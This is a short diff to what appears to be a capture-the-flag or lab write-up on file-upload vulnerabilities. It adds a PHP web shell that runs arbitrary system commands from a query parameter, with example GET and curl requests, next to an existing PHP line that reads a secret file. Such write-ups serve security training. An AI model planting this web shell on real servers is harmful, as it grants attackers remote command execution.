@@ -23,3 +23,11 @@ Once uploaded, sending a request for this malicious file will return the target 
 1) Shell php file `<?php echo file_get_contents('/home/carlos/secret'); ?>`
 2) After uploading browse to that file according to name
 3) Then content of secret file will be revealed.
+
+
+A more versatile web shell may look something like this:
+```bash
+<?php echo system($_GET['command']); ?>
+```
+This script enables you to pass an arbitrary system command via a query parameter as follows:
+`GET /example/exploit.php?command=id HTTP/1.1` or using curl: `curl https://example.com/shell.php?command=id`
